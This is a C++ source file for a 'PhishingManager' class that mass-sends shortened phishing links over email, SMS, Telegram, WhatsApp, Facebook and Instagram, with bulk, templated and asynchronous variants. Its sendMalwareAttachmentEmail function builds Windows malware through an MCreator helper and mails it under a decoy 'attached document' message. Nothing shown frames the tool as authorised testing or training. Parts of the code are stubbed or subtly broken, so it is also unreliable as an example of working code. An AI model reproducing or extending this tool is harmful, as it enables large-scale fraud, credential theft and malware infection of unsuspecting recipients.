#include "PhishingManager.h"
#include "EmailSender.h"
#include "SMSSender.h"
#include "TelegramSender.h"
#include "WhatsAppSender.h"
#include "FacebookSender.h"
#include "InstagramSender.h"
#include "Logger.h"
#include "MCreator.h"
#include "TemplateLoader.h"
#include "URLShortener.h"
#include <fstream>
#include <sstream>
#include <future>
#include <stdexcept>
#include <curl/curl.h>

PhishingManager::PhishingManager() : templateLoader(nullptr) {}

PhishingManager::~PhishingManager() {}

void PhishingManager::sendPhishingEmail(const std::string &recipient, const std::string &phishingLink, bool isHtml) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        EmailSender emailSender;
        std::string message = isHtml ? "<a href=\"" + shortenedLink + "\">Click this link</a>" : "Click this link: " + shortenedLink;
        sendPhishingMessage(emailSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingSMS(const std::string &recipient, const std::string &phishingLink) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        SMSSender smsSender;
        std::string message = "Click this link: " + shortenedLink;
        sendPhishingMessage(smsSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTelegramMessage(const std::string &recipient, const std::string &phishingLink) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        TelegramSender telegramSender;
        std::string message = "Click this link: " + shortenedLink;
        sendPhishingMessage(telegramSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingWhatsAppMessage(const std::string &recipient, const std::string &phishingLink) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        WhatsAppSender whatsappSender;
        std::string message = "Click this link: " + shortenedLink;
        sendPhishingMessage(whatsappSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingFacebookMessage(const std::string &recipient, const std::string &phishingLink) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        FacebookSender facebookSender;
        std::string message = "Click this link: " + shortenedLink;
        sendPhishingMessage(facebookSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingInstagramMessage(const std::string &recipient, const std::string &phishingLink) {
    try {
        if (!validateUrl(phishingLink)) {
            throw std::runtime_error("Invalid phishing link");
        }

        std::string shortenedLink = URLShortener::shorten(phishingLink);

        InstagramSender instagramSender;
        std::string message = "Click this link: " + shortenedLink;
        sendPhishingMessage(instagramSender, recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingEmails(const std::vector<std::string> &recipients, const std::string &phishingLink, bool isHtml) {
    for (const auto& recipient : recipients) {
        sendPhishingEmail(recipient, phishingLink, isHtml);
    }
}

void PhishingManager::sendPhishingSMSs(const std::vector<std::string> &recipients, const std::string &phishingLink) {
    for (const auto& recipient : recipients) {
        sendPhishingSMS(recipient, phishingLink);
    }
}

void PhishingManager::sendPhishingTelegramMessages(const std::vector<std::string> &recipients, const std::string &phishingLink) {
    for (const auto& recipient : recipients) {
        sendPhishingTelegramMessage(recipient, phishingLink);
    }
}

void PhishingManager::sendPhishingWhatsAppMessages(const std::vector<std::string> &recipients, const std::string &phishingLink) {
    for (const auto& recipient : recipients) {
        sendPhishingWhatsAppMessage(recipient, phishingLink);
    }
}

void PhishingManager::sendPhishingFacebookMessages(const std::vector<std::string> &recipients, const std::string &phishingLink) {
    for (const auto& recipient : recipients) {
        sendPhishingFacebookMessage(recipient, phishingLink);
    }
}

void PhishingManager::sendPhishingInstagramMessages(const std::vector<std::string> &recipients, const std::string &phishingLink) {
    for (const auto& recipient : recipients) {
        sendPhishingInstagramMessage(recipient, phishingLink);
    }
}

void PhishingManager::sendPhishingTemplateEmail(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders, bool isHtml) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingEmail(recipient, message, isHtml);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTemplateSMS(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingSMS(recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTemplateTelegramMessage(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingTelegramMessage(recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTemplateWhatsAppMessage(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingWhatsAppMessage(recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTemplateFacebookMessage(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingFacebookMessage(recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

void PhishingManager::sendPhishingTemplateInstagramMessage(const std::string &recipient, const std::string &templateName, const std::map<std::string, std::string> &placeholders) {
    try {
        if (!templateLoader) {
            throw std::runtime_error("Template loader not set");
        }
        std::string templateContent = templateLoader->loadTemplateFromFile(templateName);
        std::string message = templateLoader->fillTemplate(templateContent, placeholders);
        sendPhishingInstagramMessage(recipient, message);
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

std::future<void> PhishingManager::sendPhishingEmailAsync(const std::string &recipient, const std::string &phishingLink, bool isHtml) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingEmail, this, recipient, phishingLink, isHtml);
}

std::future<void> PhishingManager::sendPhishingSMSAsync(const std::string &recipient, const std::string &phishingLink) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingSMS, this, recipient, phishingLink);
}

std::future<void> PhishingManager::sendPhishingTelegramMessageAsync(const std::string &recipient, const std::string &phishingLink) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingTelegramMessage, this, recipient, phishingLink);
}

std::future<void> PhishingManager::sendPhishingWhatsAppMessageAsync(const std::string &recipient, const std::string &phishingLink) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingWhatsAppMessage, this, recipient, phishingLink);
}

std::future<void> PhishingManager::sendPhishingFacebookMessageAsync(const std::string &recipient, const std::string &phishingLink) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingFacebookMessage, this, recipient, phishingLink);
}

std::future<void> PhishingManager::sendPhishingInstagramMessageAsync(const std::string &recipient, const std::string &phishingLink) {
    return std::async(std::launch::async, &PhishingManager::sendPhishingInstagramMessage, this, recipient, phishingLink);
}

void PhishingManager::sendMalwareAttachmentEmail(const std::string &recipient, const std::string &payloadPath, bool isHtml) {
    try {
        std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
        EmailSender emailSender;
        std::string message = isHtml ? "<p>Please see the attached document.</p>" : "Please see the attached document.";
        emailSender.sendMessageWithAttachment(recipient, message, malwarePath);
        logMessage(recipient, "Malware attachment sent", "Sent");
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}

std::string PhishingManager::applyTemplate(const std::string &templateContent, const std::map<std::string, std::string> &placeholders) {
    std::string result = templateContent;
    for (const auto &placeholder : placeholders) {
        size_t pos = result.find("{{" + placeholder.first + "}}");
        while (pos != std::string::npos) {
            result.replace(pos, placeholder.first.length() + 4, placeholder.second);
            pos = result.find("{{" + placeholder.first + "}}");
        }
    }
    return result;
}

void PhishingManager::logMessage(const std::string &recipient, const std::string &message, const std::string &status) {
    Logger::log(Logger::INFO, "Message to " + recipient + ": " + message + " - Status: " + status);
}

std::string PhishingManager::fetchUrlReputation(const std::string &url) {
    return "reputation";
}

bool PhishingManager::validateUrl(const std::string &url) {
    return !url.empty();
}

void PhishingManager::handleSendError(const std::string &error) {
    Logger::log(Logger::ERROR, "Send error: " + error);
}

template<typename Sender>
void PhishingManager::sendPhishingMessage(Sender& sender, const std::string &recipient, const std::string &message) {
    try {
        sender.sendMessage(recipient, message);
        logMessage(recipient, message, "Sent");
    } catch (const std::exception &e) {
        logMessage(recipient, e.what(), "Failed");
        handleSendError(e.what());
    }
}



